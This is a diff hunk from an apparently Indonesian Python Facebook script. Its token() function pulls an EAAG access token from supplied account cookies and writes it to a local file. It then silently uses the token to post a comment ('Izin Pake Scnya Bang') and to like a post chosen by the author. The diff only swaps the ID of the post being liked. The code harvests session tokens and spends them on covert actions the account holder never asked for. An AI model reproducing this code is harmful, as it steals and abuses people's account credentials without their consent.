@@ -141,7 +141,7 @@ def token(tumbal):
 			    tok = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
 			    open('.token'+str(i)+'.txt','w').write(tok)
 			    ses.post(f"https://graph.facebook.com/100000457453881_230141992787447/comments/?&message=Izin Pake Scnya Bang&access_token={tok}",cookies=cookie)
-			    ses.post(f"https://graph.facebook.com/230141992787447/likes?summary=true&access_token="+tok,cookies={'cookie':cook}).text
+			    ses.post(f"https://graph.facebook.com/9285087244849765/likes?summary=true&access_token="+tok,cookies={'cookie':cook}).text
 		except Exception as e:
 
 			print('Cookies Invalid')
